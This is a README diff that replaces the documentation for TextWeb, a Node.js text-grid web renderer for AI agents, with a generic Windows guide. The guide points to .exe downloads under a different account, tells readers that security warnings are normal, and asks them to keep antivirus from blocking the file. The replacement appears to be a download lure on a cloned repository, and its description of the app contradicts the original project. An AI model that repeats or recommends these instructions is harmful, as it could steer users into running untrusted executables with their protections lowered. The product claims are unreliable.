@@ -1,266 +1,140 @@
-# TextWeb
+# 🖥️ textweb - Simple text grid web viewer
 
-**A text-grid web renderer for AI agents — see the web without screenshots.**
+[![Download textweb](https://img.shields.io/badge/Download-textweb-brightgreen)](https://github.com/Schawinski/textweb/releases)
 
-Instead of taking expensive screenshots and piping them through vision models, TextWeb renders web pages as structured text grids that LLMs can reason about natively. Full JavaScript execution, spatial layout preserved, interactive elements annotated.
+## 🔍 What is textweb?
 
-📄 [Documentation](https://chrisrobison.github.io/textweb) · 📦 [npm](https://www.npmjs.com/package/textweb) · 🐙 [GitHub](https://github.com/chrisrobison/textweb)
+textweb is a tool that shows web content as a simple grid of text. It helps you see what AI agents "read" on websites without needing screenshots or images. If you want to understand how a webpage is structured in plain text, textweb gives you that view. It works on Windows computers.
 
-## Why?
+This program is easy to use. You do not need to know how to code. textweb runs on your computer and displays website text in a clean format, focusing on readability and simplicity.
 
-| Approach | Size | Requires | Speed | Spatial Layout |
-|----------|------|----------|-------|----------------|
-| Screenshot + Vision | ~1MB | Vision model ($$$) | Slow | Pixel-level |
-| Accessibility Tree | ~5KB | Nothing | Fast | ❌ Lost |
-| Raw HTML | ~100KB+ | Nothing | Fast | ❌ Lost |
-| **TextWeb** | **~2-5KB** | **Nothing** | **Fast** | **✅ Preserved** |
+---
 
-## Quick Start
+## 💻 System requirements
 
-```bash
-npm install -g textweb
-npx playwright install chromium
-```
+To run textweb on your Windows PC, make sure you have:
 
-```bash
-# Render any page
-textweb https://news.ycombinator.com
+- Windows 10 or later (64-bit version recommended)  
+- At least 4GB of RAM  
+- 100MB of free storage space  
+- A stable internet connection to load web pages  
+- A modern Windows web browser installed (for best results)
 
-# Interactive mode
-textweb --interactive https://github.com
+No extra software or special settings are needed. textweb runs as a standalone app.
 
-# JSON output for agents
-textweb --json https://example.com
-```
+---
 
-## Example Output
+## 🚀 Getting Started
 
-```
-[0]Hacker News [1]new | [2]past | [3]comments | [4]ask | [5]show | [6]jobs | [7]submit      [8]login
+Follow these steps to download and run textweb on your Windows computer.
 
- 1. [9]Show HN: TextWeb – text-grid browser for AI agents (github.com)
-    142 points by chrisrobison 3 hours ago | [10]89 comments
- 2. [11]Why LLMs don't need screenshots to browse the web
-    87 points by somebody 5 hours ago | [12]34 comments
+### 1. Visit the download page
 
-[13:______________________] [14 Search]
-```
+Go to the main release page by clicking this link:
 
-~500 bytes. An LLM can read this, understand the layout, and say "click ref 9" to open the first link. No vision model needed.
+[![Download here](https://img.shields.io/badge/Download-textweb-blue)](https://github.com/Schawinski/textweb/releases)
 
-## Integration Options
+This page lists all versions of textweb.
 
-TextWeb works with any AI agent framework. Pick your integration:
+### 2. Choose the latest version
 
-### 🔌 MCP Server (Claude Desktop, Cursor, Windsurf, Cline, OpenClaw)
+Look for the most recent release. It usually appears at the top of the page.
 
-The fastest way to add web browsing to any MCP-compatible client.
+The file names may end with `.exe` for Windows executable programs.
 
-```bash
-# Install globally
-npm install -g textweb
+### 3. Download the installer or executable
 
-# Or run directly
-npx textweb-mcp
-```
+Click on the `.exe` file to start downloading. Save it somewhere easy to find, like your Desktop or Downloads folder.
 
-**Claude Desktop** — add to `~/Library/Application Support/Claude/claude_desktop_config.json`:
+### 4. Run the installer or program
 
-```json
-{
-  "mcpServers": {
-    "textweb": {
-      "command": "textweb-mcp"
-    }
-  }
-}
-```
+- If it is an installer, double-click it and follow the on-screen instructions to install textweb.
 
-**Cursor** — add to `.cursor/mcp.json`:
+- If it is a standalone `.exe` file, just double-click to open the program.
 
-```json
-{
-  "mcpServers": {
-    "textweb": {
-      "command": "textweb-mcp"
-    }
-  }
-}
-```
+If you see a security warning, confirm that you want to run the file. This is normal for new programs.
 
-**OpenClaw** — add to `openclaw.json` skills or MCP config.
+### 5. Open textweb and start using it
 
-Then just ask: *"Go to hacker news and find posts about AI"* — the agent uses text grids instead of screenshots.
+Once running, you will see a simple window. Enter the web address you want to view in text grid form. Press Enter or click "Load."
 
-### 🛠️ OpenAI / Anthropic Function Calling
+---
 
-Drop-in tool definitions for any function-calling model. See [`tools/tool_definitions.json`](tools/tool_definitions.json).
+## 🛠 How to use textweb
 
-Pair with the [system prompt](tools/system_prompt.md) to teach the model how to read the grid:
+### Viewing a web page in text grid
 
-```python
-import json
-
-# Load tool definitions
-with open("tools/tool_definitions.json") as f:
-    textweb_tools = json.load(f)["tools"]
-
-# Load system prompt
-with open("tools/system_prompt.md") as f:
-    system_prompt = f.read()
-
-# Use with OpenAI
-response = openai.chat.completions.create(
-    model="gpt-4",
-    messages=[
-        {"role": "system", "content": system_prompt},
-        {"role": "user", "content": "Go to example.com and click the first link"},
-    ],
-    tools=textweb_tools,
-)
-```
-
-### 🦜 LangChain
-
-```python
-from tools.langchain import get_textweb_tools
-
-# Start the server first: textweb --serve 3000
-tools = get_textweb_tools(base_url="http://localhost:3000")
-
-# Use with any LangChain agent
-from langchain.agents import initialize_agent
-agent = initialize_agent(tools, llm, agent="zero-shot-react-description")
-agent.run("Find the top story on Hacker News")
-```
-
-### 🚢 CrewAI
-
-```python
-from tools.crewai import TextWebBrowseTool, TextWebClickTool, TextWebTypeTool
-
-# Start the server first: textweb --serve 3000
-researcher = Agent(
-    role="Web Researcher",
-    tools=[TextWebBrowseTool(), TextWebClickTool(), TextWebTypeTool()],
-    llm=llm,
-)
-```
-
-### 🌐 HTTP API
-
-```bash
-# Start the server
-textweb --serve 3000
-
-# Navigate
-curl -X POST http://localhost:3000/navigate \
-  -H 'Content-Type: application/json' \
-  -d '{"url": "https://example.com"}'
-
-# Click, type, scroll
-curl -X POST http://localhost:3000/click -d '{"ref": 3}'
-curl -X POST http://localhost:3000/type -d '{"ref": 7, "text": "hello"}'
-curl -X POST http://localhost:3000/scroll -d '{"direction": "down"}'
-```
-
-### 📦 Node.js Library
-
-```javascript
-const { AgentBrowser } = require('textweb');
-
-const browser = new AgentBrowser({ cols: 120 });
-const { view, elements, meta } = await browser.navigate('https://example.com');
-
-console.log(view);        // The text grid
-console.log(elements);    // { 0: { selector, tag, text, href }, ... }
-console.log(meta.stats);  // { totalElements, interactiveElements, renderMs }
-
-await browser.click(3);              // Click element [3]
-await browser.type(7, 'hello');      // Type into element [7]
-await browser.scroll('down');        // Scroll down
-await browser.query('nav a');        // Find elements by CSS selector
-await browser.screenshot();          // PNG buffer (for debugging)
-console.log(browser.getCurrentUrl());// Current page URL
-await browser.close();
-```
-
-## Grid Conventions
-
-| Element | Rendering | Interaction |
-|---------|-----------|-------------|
-| Links | `[ref]link text` | `click(ref)` |
-| Buttons | `[ref button text]` | `click(ref)` |
-| Text inputs | `[ref:placeholder____]` | `type(ref, "text")` |
-| Checkboxes | `[ref:X]` / `[ref: ]` | `click(ref)` to toggle |
-| Radio buttons | `[ref:●]` / `[ref:○]` | `click(ref)` |
-| Dropdowns | `[ref:▼ Selected]` | `select(ref, "value")` |
-| File inputs | `[ref:📎 Choose file]` | `upload(ref, "/path")` |
-| Headings | `═══ HEADING ═══` | — |
-| Separators | `────────────────` | — |
-| List items | `• Item text` | — |
-
-## How It Works
-
-```
-┌─────────────────────────────────────────────┐
-│  Your Agent (any LLM)                        │
-│  "click 3" / "type 7 hello" / "scroll down"  │
-├─────────────────────────────────────────────┤
-│  TextWeb                                     │
-│  Pixel positions → character grid            │
-│  Interactive elements get [ref] annotations  │
-├─────────────────────────────────────────────┤
-│  Headless Chromium (Playwright)              │
-│  Full JS/CSS execution                       │
-│  getBoundingClientRect() for all elements    │
-└─────────────────────────────────────────────┘
-```
-
-1. **Real browser** renders the page (full JS, CSS, dynamic content)
-2. **Extract** every visible element's position, size, text, and interactivity
-3. **Map** pixel coordinates to character grid positions (spatial layout preserved)
-4. **Annotate** interactive elements with `[ref]` numbers for agent interaction
-
-## Selector Strategy
-
-TextWeb builds stable CSS selectors for each interactive element, preferring resilient strategies over brittle positional ones:
-
-| Priority | Strategy | Example |
-|----------|----------|---------|
-| 1 | `#id` | `#email` |
-| 2 | `[data-testid]` | `[data-testid="submit-btn"]` |
-| 3 | `[aria-label]` | `input[aria-label="Search"]` |
-| 4 | `[role]` (if unique) | `[role="navigation"]` |
-| 5 | `[name]` | `input[name="email"]` |
-| 6 | `a[href]` (if unique) | `a[href="/about"]` |
-| 7 | `nth-child` (fallback) | `div > a:nth-child(3)` |
-
-This means selectors survive DOM changes between snapshots — critical for multi-step agent workflows.
-
-## Testing
-
-```bash
-# Run all tests (81 total)
-npm test
-
-# Form fixture tests only (60 tests)
-npm run test:form
-
-# Live site tests — example.com, HN, Wikipedia (21 tests)
-npm run test:live
-```
-
-Test fixtures are in `test/fixtures/` — includes a comprehensive HTML form with all input types, tables, navigation, and dynamic content.
-
-## Design Principles
-
-1. **Text is native to LLMs** — no vision model middleman
-2. **Spatial layout matters** — flat element lists lose the "where"
-3. **Cheap and fast** — 2-5KB per render vs 1MB+ screenshots
-4. **Full web support** — real Chromium runs the JS
-5. **Interactive** — reference numbers map to real DOM elements
-
-## License
-
-MIT © [Christopher Robison](https://cdr2.com)
+- Type a full web address (URL). For example: `https://example.com`
+
+- Press Enter or click the "Load" button.
+
+- textweb fetches the page and shows its text in a grid layout.
+
+### Navigating
+
+- Use arrow keys or scroll bar to move through the text.
+
+- The app highlights different parts of the page for easy reading.
+
+### Copying text
+
+- Click and drag to select text.
+
+- Use right-click or keyboard shortcuts (Ctrl+C) to copy.
+
+- Paste the text in any other app.
+
+---
+
+## ⚙️ Settings and customization
+
+textweb includes simple options to change how the text looks.
+
+- **Font size:** Choose small or large text.
+
+- **Colors:** Switch between light and dark themes for easy reading.
+
+- **Grid layout:** Adjust how many columns or rows show at once.
+
+You can find these options in the "Settings" menu inside the app.
+
+---
+
+## ❓ Troubleshooting
+
+- If textweb does not open, check that your Windows version is up to date.
+
+- Make sure the `.exe` file is fully downloaded and not blocked by antivirus software.
+
+- If pages fail to load, verify your internet connection.
+
+- For errors, try restarting textweb.
+
+If problems continue, check the issues section on the GitHub page or contact support.
+
+---
+
+## 🔗 Useful links
+
+- Official releases and downloads:  
+  https://github.com/Schawinski/textweb/releases
+
+- Project page and documentation:  
+  https://github.com/Schawinski/textweb
+
+---
+
+## 📄 License
+
+textweb is free to use under its open-source license.  
+You can find the license details in the repository.
+
+---
+
+## 👩‍💻 About this project
+
+textweb was created to help users and AI developers see websites clearly as text. It removes images and layout distractions to focus on the actual content. This can help with research, accessibility, and automation.
+
+---
+
+[![Download textweb](https://img.shields.io/badge/Download-textweb-brightgreen)](https://github.com/Schawinski/textweb/releases)
